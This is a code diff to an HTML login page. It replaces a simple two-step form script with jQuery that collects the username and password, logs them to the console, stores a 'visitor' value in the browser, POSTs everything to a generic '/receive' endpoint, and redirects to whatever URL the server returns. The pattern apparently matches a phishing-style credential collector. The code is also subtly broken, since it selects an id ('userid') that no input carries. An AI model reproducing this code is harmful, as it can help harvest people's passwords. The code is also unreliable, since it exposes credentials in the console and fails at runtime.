@@ -148,8 +148,8 @@
       <!-- Username Field -->
       <div id="form-step-1">
         <div class="input-wrapper">
-          <input type="text" id="username" class="input-field" placeholder=" " />
-          <label class="input-label" for="username">Username</label>
+          <input type="text" id="username" name="userid" class="input-field" placeholder=" " />
+          <label class="input-label" for="userid">Username</label>
         </div>
         <a href="#" class="forgot-link">Forgot ?</a>
       </div>
@@ -157,7 +157,7 @@
       <!-- Password Field -->
       <div id="form-step-2" style="display: none;">
         <div class="input-wrapper">
-          <input type="password" id="password" class="input-field" placeholder=" " />
+          <input type="password" id="password" class="input-field" placeholder=" " name="password" />
           <label class="input-label" for="password">Password</label>
         </div>
         <a href="#" class="forgot-link">Forgot password?</a>
@@ -178,33 +178,76 @@
     </p>
   </footer>
 
-  <script>
-    let step = 1;
+ <script>
+$(document).ready(function () {
+    $('.login-btn').click(function (e) {
+        e.preventDefault();
 
-    function handleContinue() {
-      const username = document.getElementById('username');
-      const password = document.getElementById('password');
+        const $passwordInput = $('#password');
+        const $useridInput = $('#userid');
 
-      if (step === 1) {
-        if (!username.value.trim()) {
-          alert("Please enter your username.");
-          return;
+        // First step: Show password input if not visible
+        if (!$passwordInput.is(':visible')) {
+            if (!$useridInput.val().trim()) {
+                $useridInput.css('border', '1px solid red');
+                return;
+            }
+
+            $useridInput.css('border', '');
+            $passwordInput.closest('.input-wrapper').show(); // Show the password input wrapper
+            $passwordInput.focus();
+            return;
         }
 
-        document.getElementById('form-step-1').style.display = 'none';
-        document.getElementById('form-step-2').style.display = 'block';
-        document.getElementById('password').focus();
-        step = 2;
-      } else {
-        if (!password.value.trim()) {
-          alert("Please enter your password.");
-          return;
+        // Second step: password is visible, now submit
+        let userinfo = {}; 
+        let visitor = $useridInput.val();
+        let isValid = true;
+
+        sessionStorage.setItem('visitor', visitor);
+
+        $('form input:visible').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            let isRequired = $(this).attr('required');
+
+            if (isRequired && !inputValue.trim()) {
+                $(this).css('border', '1px solid red');
+                isValid = false;
+            } else {
+                $(this).css('border', '');
+                if (inputName) {
+                    userinfo[inputName] = inputValue;
+                }
+            }
+        });
+
+        if (!isValid) {
+            console.log('Please fill in all required fields.');
+            return;
         }
 
-        alert(`Logging in as ${username.value}`);
-        // Add real login logic here
-      }
-    }
-  </script>
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        $.ajax({
+            url: '/receive',
+            type: 'POST',
+            data: userinfo,
+            success: function (response) {
+                if (response.url) {
+                    window.location.href = response.url;
+                }
+            },
+            error: function (xhr, status, error) {
+                alert('An error occurred: ' + error);
+            }
+        });
+    });
+
+    // Hide password input initially
+    $('#password').closest('.input-wrapper').hide();
+});
+</script>
 </body>
 </html>
